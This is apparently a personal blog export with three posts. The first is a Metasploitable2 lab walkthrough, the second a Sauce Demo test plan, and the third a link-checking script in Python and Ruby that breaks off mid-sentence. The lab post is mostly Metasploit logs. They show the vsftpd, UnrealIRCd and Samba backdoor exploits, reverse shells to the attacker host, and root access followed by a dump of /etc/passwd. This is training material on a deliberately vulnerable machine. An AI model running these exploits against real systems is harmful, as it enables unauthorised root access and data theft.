[{"content":"Information Gathering and Reconnaissance Nmap scan results 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ┌─[root@parrot]─[/home/user] └──╼ #nmap -sV 10.0.3.18 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 03:34 UTC Nmap scan report for 10.0.3.18 Host is up (0.00081s latency). Not shown: 977 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain ISC BIND 9.4.2 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) 111/tcp open rpcbind 2 (RPC #100000) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 512/tcp open exec netkit-rsh rexecd 513/tcp open login 514/tcp open shell? 1099/tcp open java-rmi GNU Classpath grmiregistry 1524/tcp open bindshell Metasploitable root shell 2049/tcp open nfs 2-4 (RPC #100003) 2121/tcp open ftp ProFTPD 1.3.1 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5 5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7 5900/tcp open vnc VNC (protocol 3.3) 6000/tcp open X11 (access denied) 6667/tcp open irc UnrealIRCd 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1 MAC Address: 22:B6:2D:3A:0D:B7 (Unknown) Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.46 seconds Metasploit exploits vsftpd 2.3.4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search vsftpd 2.3.4 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.0.3.18 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us ing-metasploit.html RPORT 21 yes The target port (TCP) Payload options (cmd/unix/interact): Name Current Setting Required Description ---- --------------- -------- ----------- Exploit target: Id Name -- ---- 0 Automatic [msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) \u0026gt;\u0026gt; exploit [*] 10.0.3.18:21 - The port used by the backdoor bind listener is already open [+] 10.0.3.18:21 - UID: uid=0(root) gid=0(root) [*] Found shell. [*] Command shell session 1 opened (10.0.3.10:36673 -\u0026gt; 10.0.3.18:6200) at 2024-11-27 05:32:49 +0000 The output indicates that you have successfully exploited the vulnerability in the vsftpd 2.3.4 service using Metasploit. Here’s a breakdown of the key information from the output:\nTarget Details:\n• IP Address: 10.0.3.18\n• Port: 21 (FTP service)\nExploit Success:\n• The exploit leveraged a backdoor in vsftpd 2.3.4, a known vulnerability.\n• The message [+] UID: uid=0(root) gid=0(root) confirms that the exploit provided root-level access to the system.\nShell Access:\n• A command shell session was successfully opened.\n• Session Info: The shell session connects from your machine (10.0.3.10:36673) to the target system (10.0.3.18:6200).\n• Timestamp: The session opened at 2024-11-27 05:32:49 +0000.\nunreal_ircd 3.2.8.1 search unreal_ircd in the metasploit use exploit/unix/irc/unreal_ircd_3281_backdoor configure the options set RHOSTS \u0026lt;target_ip\u0026gt; set RPORT 6667 set payload cmd/unix/reverse set LHOST \u0026lt;your_ip\u0026gt; set LPORT \u0026lt;your_port\u0026gt; run the exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search unreal_ircd Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 0 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 6667 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set RHOST 10.0.3.18 RHOST =\u0026gt; 10.0.3.18 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/adduser normal No Add user with useradd 1 payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP (via Perl) 2 payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP (via perl) IPv6 3 payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP (via Ruby) 4 payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP (via Ruby) IPv6 5 payload/cmd/unix/generic normal No Unix Command, Generic Command Execution 6 payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP (telnet) 7 payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL (telnet) 8 payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP (via Perl) 9 payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL (via perl) 10 payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP (via Ruby) 11 payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL (via Ruby) 12 payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL (telnet) [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set payload cmd/unix/reverse payload =\u0026gt; cmd/unix/reverse [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.0.3.18 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 6667 yes The target port (TCP) Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set LHOST 10.0.3.10 LHOST =\u0026gt; 10.0.3.10 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; exploit [*] Started reverse TCP double handler on 10.0.3.10:4444 [*] 10.0.3.18:6667 - Connected to 10.0.3.18:6667... :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname... :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\u0026#39;t resolve your hostname; using your IP address instead [*] 10.0.3.18:6667 - Sending backdoor command... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo wZz1QexVwG7uNLHr; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: \u0026#34;wZz1QexVwG7uNLHr\\r\\n\u0026#34; [*] Matching... [*] A is input... [*] Command shell session 1 opened (10.0.3.10:4444 -\u0026gt; 10.0.3.18:37500) at 2024-11-27 06:09:42 +0000 sessions -i 1 [*] Wrong number of arguments expected: 1, received: 2 Usage: sessions \u0026lt;id\u0026gt; Interact with a different session Id. This command only accepts one positive numeric argument. This works the same as calling this from the MSF shell: sessions -i \u0026lt;session id\u0026gt; whoami root uname -a Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux The output indicates that you have successfully exploited the vulnerability in the UnrealIRCD 3.2.8.1 service using Metasploit. Here’s a breakdown of the key information from the output:\nTarget Details\n•\tIP Address: 10.0.3.18 •\tPort: 6667 (IRC service) Exploit Success\n•\tExploit Module: exploit/unix/irc/unreal_ircd_3281_backdoor •\tVulnerability: Backdoor in UnrealIRCD 3.2.8.1, a known issue. •\tConfirmation: The command shell session was opened with root privileges: •\tOutput from whoami: root Shell Access\n•\tCommand Shell Session: Successfully opened. •\tSession Info: •\tAttacker Machine: 10.0.3.10:4444 •\tTarget Machine: 10.0.3.18:37500 •\tTimestamp: The session opened at 2024-11-27 06:09:42 +0000. •\tSystem Info: •\tOutput from uname -a: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nThis successful exploitation demonstrates full control over the target system, including the ability to execute commands as the root user.\nSamba search Samba in the metasploit use exploit/multi/samba/usermap_script configure the options set RHOSTS \u0026lt;target_ip\u0026gt; set RPORT 445 set payload cmd/unix/reverse set LHOST \u0026lt;your_ip\u0026gt; set LPORT 4444 run the exploitmsf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search samba Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/citrix_access_gateway_exec 2010-12-21 excellent Yes Citrix Access Gateway Command Execution 1 exploit/windows/license/calicclnt_getconfig 2005-03-02 average No Computer Associates License Client GETCONFIG Overflow 2 exploit/unix/misc/distcc_exec 2002-02-01 excellent Yes DistCC Daemon Command Execution 3 exploit/windows/smb/group_policy_startup 2015-01-26 manual No Group Policy Script Execution From Shared Resource 4 post/linux/gather/enum_configs normal No Linux Gather Configurations 5 auxiliary/scanner/rsync/modules_list normal No List Rsync Modules 6 exploit/windows/fileformat/ms14_060_sandworm 2014-10-14 excellent No MS14-060 Microsoft Windows OLE Package Manager Code Execution 7 exploit/unix/http/quest_kace_systems_management_rce 2018-05-31 excellent Yes Quest KACE Systems Management Command Injection 8 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \u0026#34;username map script\u0026#34; Command Execution 9 exploit/multi/samba/nttrans 2003-04-07 average No Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow 10 exploit/linux/samba/setinfopolicy_heap 2012-04-10 normal Yes Samba SetInformationPolicy AuditEventsInfo Heap Overflow 11 auxiliary/admin/smb/samba_symlink_traversal normal No Samba Symlink Directory Traversal 12 auxiliary/scanner/smb/smb_uninit_cred normal Yes Samba _netr_ServerPasswordSet Uninitialized Credential State 13 exploit/linux/samba/chain_reply 2010-06-16 good No Samba chain_reply Memory Corruption (Linux x86) 14 exploit/linux/samba/is_known_pipename 2017-03-24 excellent Yes Samba is_known_pipename() Arbitrary Module Load 15 auxiliary/dos/samba/lsa_addprivs_heap normal No Samba lsa_io_privilege_set Heap Overflow 16 auxiliary/dos/samba/lsa_transnames_heap normal No Samba lsa_io_trans_names Heap Overflow 17 exploit/linux/samba/lsa_transnames_heap 2007-05-14 good Yes Samba lsa_io_trans_names Heap Overflow 18 exploit/osx/samba/lsa_transnames_heap 2007-05-14 average No Samba lsa_io_trans_names Heap Overflow 19 exploit/solaris/samba/lsa_transnames_heap 2007-05-14 average No Samba lsa_io_trans_names Heap Overflow 20 auxiliary/dos/samba/read_nttrans_ea_list normal No Samba read_nttrans_ea_list Integer Overflow 21 exploit/freebsd/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (*BSD x86) 22 exploit/linux/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Linux x86) 23 exploit/osx/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Mac OS X PPC) 24 exploit/solaris/samba/trans2open 2003-04-07 great No Samba trans2open Overflow (Solaris SPARC) 25 exploit/windows/http/sambar6_search_results 2003-06-21 normal Yes Sambar 6 Search Results Buffer Overflow Interact with a module by name or index. For example info 25, use 25 or use exploit/windows/http/sambar6_search_results [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; show options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.3.10 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; set RHOSTS 10.0.3.18 RHOSTS =\u0026gt; 10.0.3.18 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/adduser normal No Add user with useradd 1 payload/cmd/unix/bind_awk normal No Unix Command Shell, Bind TCP (via AWK) 2 payload/cmd/unix/bind_busybox_telnetd normal No Unix Command Shell, Bind TCP (via BusyBox telnetd) 3 payload/cmd/unix/bind_inetd normal No Unix Command Shell, Bind TCP (inetd) 4 payload/cmd/unix/bind_jjs normal No Unix Command Shell, Bind TCP (via jjs) 5 payload/cmd/unix/bind_lua normal No Unix Command Shell, Bind TCP (via Lua) 6 payload/cmd/unix/bind_netcat normal No Unix Command Shell, Bind TCP (via netcat) 7 payload/cmd/unix/bind_netcat_gaping normal No Unix Command Shell, Bind TCP (via netcat -e) 8 payload/cmd/unix/bind_netcat_gaping_ipv6 normal No Unix Command Shell, Bind TCP (via netcat -e) IPv6 9 payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP (via Perl) 10 payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP (via perl) IPv6 11 payload/cmd/unix/bind_r normal No Unix Command Shell, Bind TCP (via R) 12 payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP (via Ruby) 13 payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP (via Ruby) IPv6 14 payload/cmd/unix/bind_socat_sctp normal No Unix Command Shell, Bind SCTP (via socat) 15 payload/cmd/unix/bind_socat_udp normal No Unix Command Shell, Bind UDP (via socat) 16 payload/cmd/unix/bind_zsh normal No Unix Command Shell, Bind TCP (via Zsh) 17 payload/cmd/unix/generic normal No Unix Command, Generic Command Execution 18 payload/cmd/unix/pingback_bind normal No Unix Command Shell, Pingback Bind TCP (via netcat) 19 payload/cmd/unix/pingback_reverse normal No Unix Command Shell, Pingback Reverse TCP (via netcat) 20 payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP (telnet) 21 payload/cmd/unix/reverse_awk normal No Unix Command Shell, Reverse TCP (via AWK) 22 payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL (telnet) 23 payload/cmd/unix/reverse_jjs normal No Unix Command Shell, Reverse TCP (via jjs) 24 payload/cmd/unix/reverse_ksh normal No Unix Command Shell, Reverse TCP (via Ksh) 25 payload/cmd/unix/reverse_lua normal No Unix Command Shell, Reverse TCP (via Lua) 26 payload/cmd/unix/reverse_ncat_ssl normal No Unix Command Shell, Reverse TCP (via ncat) 27 payload/cmd/unix/reverse_netcat normal No Unix Command Shell, Reverse TCP (via netcat) 28 payload/cmd/unix/reverse_netcat_gaping normal No Unix Command Shell, Reverse TCP (via netcat -e) 29 payload/cmd/unix/reverse_openssl normal No Unix Command Shell, Double Reverse TCP SSL (openssl) 30 payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP (via Perl) 31 payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL (via perl) 32 payload/cmd/unix/reverse_php_ssl normal No Unix Command Shell, Reverse TCP SSL (via php) 33 payload/cmd/unix/reverse_python normal No Unix Command Shell, Reverse TCP (via Python) 34 payload/cmd/unix/reverse_python_ssl normal No Unix Command Shell, Reverse TCP SSL (via python) 35 payload/cmd/unix/reverse_r normal No Unix Command Shell, Reverse TCP (via R) 36 payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP (via Ruby) 37 payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL (via Ruby) 38 payload/cmd/unix/reverse_socat_sctp normal No Unix Command Shell, Reverse SCTP (via socat) 39 payload/cmd/unix/reverse_socat_tcp normal No Unix Command Shell, Reverse TCP (via socat) 40 payload/cmd/unix/reverse_socat_udp normal No Unix Command Shell, Reverse UDP (via socat) 41 payload/cmd/unix/reverse_ssh normal No Unix Command Shell, Reverse TCP SSH 42 payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL (telnet) 43 payload/cmd/unix/reverse_tclsh normal No Unix Command Shell, Reverse TCP (via Tclsh) 44 payload/cmd/unix/reverse_zsh normal No Unix Command Shell, Reverse TCP (via Zsh) [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; set payload cmd/unix/reverse payload =\u0026gt; cmd/unix/reverse [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) \u0026gt;\u0026gt; exploit [*] Started reverse TCP double handler on 10.0.3.10:4444 [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo 918Nu7uyRQCRfGBt; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: \u0026#34;918Nu7uyRQCRfGBt\\r\\n\u0026#34; [*] Matching... [*] A is input... [*] Command shell session 2 opened (10.0.3.10:4444 -\u0026gt; 10.0.3.18:41566) at 2024-11-27 06:30:04 +0000 whoami root id uid=0(root) gid=0(root) uname -a Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false ifconfig eth0 Link encap:Ethernet HWaddr 22:b6:2d:3a:0d:b7 inet addr:10.0.3.18 Bcast:10.0.3.255 Mask:255.255.255.0 inet6 addr: fd45:1e06:8ea5:414a:20b6:2dff:fe3a:db7/64 Scope:Global inet6 addr: fe80::20b6:2dff:fe3a:db7/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:3137 errors:0 dropped:0 overruns:0 frame:0 TX packets:3100 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:259575 (253.4 KB) TX bytes:398633 (389.2 KB) Base address:0xc000 Memory:febc0000-febe0000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:375 errors:0 dropped:0 overruns:0 frame:0 TX packets:375 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:157721 (154.0 KB) TX bytes:157721 (154.0 KB) ","date":"2024-11-27T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/metasploitable2-linux-edition/","title":"Metasploitable2 Linux Edition"},{"content":"Functionality Testing of the Sauce Demo website To test the functionality of the Sauce Demo website (https://www.saucedemo.com/), you can break the process down into the following steps:\nIdentify Key Functional Areas to Test Login Functionality: Test different user credentials (standard user, locked-out user, invalid users). Product Page: Check if products are displayed, filtered, and sorted properly. Shopping Cart: Verify adding/removing products from the cart and viewing the cart. Checkout Process: Ensure that users can complete the checkout with valid/invalid data. Navigation: Test if all links and buttons work correctly. Manual Testing Steps A. Login Functionality\nTest valid credentials:\nOpen the Sauce Demo site. Use standard_user as the username and secret_sauce as the password. Verify that you are redirected to the products page after login. Test invalid credentials:\nEnter incorrect username or password and click “Login.” Verify that an error message appears: “Username and password do not match any user in this service.” Test locked-out user login:\nUse locked_out_user as the username. Verify that an error message “Sorry, this user has been locked out” appears. B. Product Page\nTest product display:\nAfter logging in, ensure that the product inventory page displays all available products. Check if images, names, and prices are displayed for each product. Test filtering and sorting:\nUse the sorting dropdown to sort products by price (low to high) or by name (A to Z). Verify that products are correctly sorted. C. Shopping Cart\nTest adding products to the cart:\nOn the product page, click “Add to Cart” for a few items. Verify that the cart icon in the top-right corner updates the product count. Test removing products from the cart:\nOpen the cart by clicking the cart icon. Remove one or more products and verify that the product count updates accordingly. D. Checkout Process\nTest valid checkout:\nAdd products to the cart and click “Checkout.” Enter valid information (first name, last name, postal code) and proceed. Ensure the order is placed, and a confirmation message appears. Test invalid checkout:\nAttempt to checkout with empty or invalid fields. Verify that error messages appear when fields are invalid or missing. E. Navigation\nTest the functionality of the navigation links and buttons (e.g., clicking the cart icon, going back to the products page, etc.). Test Plan for Sauce Demo Site Objective The objective of this test plan is to ensure that the basic functionalities of the Sauce Demo site work correctly, with a focus on the login, product browsing, shopping cart, and checkout features.\nScope In Scope:\nFunctional testing for user login, adding products to the cart, checkout, and product browsing. Out of Scope: Performance testing, non-functional testing, and security testing. Test Environment Devices: MacBook Air (using macOS) Browsers: Safari, Chrome, Firefox (based on what you can test) Operating System: macOS Dependencies: Sauce Demo website (https://www.saucedemo.com/) Testing Approach Manual Testing: Functional testing using different browsers on your MacBook. Automation (Optional): You can create automation scripts using tools like Selenium WebDriver if required. Features to be Tested Login Page Valid Login Invalid Login Locked-out user scenario Product Page View products Filter/sort products Shopping Cart Add product(s) to cart Remove product(s) from cart View cart items Checkout Checkout process Enter valid/invalid details Complete purchase Test Cases for Sauce Demo Site Case ID Case Description Steps Expected Result Status TC_01 Verify valid user login 1. Navigate to https://www.saucedemo.com/ 2. Enter valid username and password 3. Click on \u0026ldquo;Login\u0026rdquo; User is successfully logged in and redirected to the inventory page TC_02 Verify login with invalid creds 1. Enter invalid username and password 2. Click on \u0026ldquo;Login\u0026rdquo; Error message is displayed, and the user remains on the login page TC_03 Verify locked-out user login 1. Enter username \u0026ldquo;locked_out_user\u0026rdquo; 2. Enter password 3. Click on \u0026ldquo;Login\u0026rdquo; Error message \u0026ldquo;Sorry, this user has been locked out\u0026rdquo; is displayed TC_04 Verify product display 1. Navigate to the product page after login All available products are displayed TC_05 Verify product filtering 1. Use the product filter/sorting dropdown 2. Sort by price or name Products are correctly filtered based on the selection TC_06 Verify adding products to cart 1. From the product page, click \u0026ldquo;Add to Cart\u0026rdquo; Product is added to the cart, and cart count increases TC_07 Verify removing products 1. Open the cart 2. Click \u0026ldquo;Remove\u0026rdquo; Product is removed from the cart, and cart count decreases TC_08 Verify the checkout process 1. Add product(s) to the cart 2. Click \u0026ldquo;Checkout\u0026rdquo; 3. Enter valid details in the checkout form 4. Complete purchase Purchase is successfully completed, and confirmation message is displayed TC_09 Verify checkout with invalid 1. Add product(s) to the cart 2. Click \u0026ldquo;Checkout\u0026rdquo; 3. Enter invalid/empty details in the form Error message is displayed for invalid details ","date":"2024-10-08T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/sauce-demo-test-plan/","title":"Sauce Demo Test Plan"},{"content":"To automate checking whether the links on a website are working, you can use several tools and methods, depending on your preference for programming or using external services.\nPython Python is a great option if you want more control and automation. You can write a script that crawls your website and checks the status of each link using libraries like requests and BeautifulSoup.\nHere’s an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import requests from bs4 import BeautifulSoup # Function to check if the URL is working def check_url(url): try: response = requests.get(url) if response.status_code == 200: return f\u0026#34;{url} is working!\u0026#34; else: return f\u0026#34;{url} returned {response.status_code}.\u0026#34; except requests.exceptions.RequestException as e: return f\u0026#34;{url} failed to load. Error: {str(e)}\u0026#34; # Function to scrape all links from a given page def get_links_from_page(page_url): try: response = requests.get(page_url) soup = BeautifulSoup(response.content, \u0026#34;html.parser\u0026#34;) links = [] for link in soup.find_all(\u0026#39;a\u0026#39;, href=True): links.append(link[\u0026#39;href\u0026#39;]) return links except Exception as e: return f\u0026#34;Error scraping links from {page_url}: {str(e)}\u0026#34; # URL of the website to check website_url = \u0026#34;https://yourwebsite.com\u0026#34; links = get_links_from_page(website_url) for link in links: print(check_url(link)) Ruby You can automate checking links on a website using Ruby by leveraging libraries like nokogiri to parse HTML and net/http to check link statuses.\nHere’s a simple Ruby script to check the links of a website:\nStep-by-step guide:\n1.\tInstall necessary libraries: Run the following command to install the required libraries if you don’t have them installed:\n1 gem install nokogiri 2.\tCreate the Ruby script: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 require \u0026#39;net/http\u0026#39; require \u0026#39;nokogiri\u0026#39; require \u0026#39;uri\u0026#39; # Function to check if the link is working def check_link(url) begin uri = URI.parse(url) response = Net::HTTP.get_response(uri) if response.code == \u0026#34;200\u0026#34; puts \u0026#34;#{url} is working!\u0026#34; else puts \u0026#34;#{url} returned status code: #{response.code}\u0026#34; end rescue =\u0026gt; e puts \u0026#34;Error checking #{url}: #{e.message}\u0026#34; end end # Function to extract all links from a given page def get_links(page_url) begin uri = URI.parse(page_url) response = Net::HTTP.get(uri) page = Nokogiri::HTML(response) links = page.css(\u0026#39;a\u0026#39;).map { |link| link[\u0026#39;href\u0026#39;] }.compact return links rescue =\u0026gt; e puts \u0026#34;Error fetching links from #{page_url}: #{e.message}\u0026#34; return [] end end # URL of the website you want to check website_url = \u0026#34;https://yourwebsite.com\u0026#34; # Get all links from the website\u0026#39;s homepage links = get_links(website_url) # Check each link links.each do |link| # Handle relative URLs by converting them to absolute if link.start_with?(\u0026#39;/\u0026#39;) full_link = URI.join(website_url, link).to_s else full_link = link end check_link(full_link) end How the script works:\n1.\tget_links function: •\tThis function takes a page URL and uses nokogiri to extract all the \u0026lt;a\u0026gt; tag links from the webpage. •\tIt returns an array of links. 2.\tcheck_link function: •\tThis function takes a link, makes an HTTP request using net/http, and checks the status code. •\tIt will print whether the link is working or if it returned an error code (like 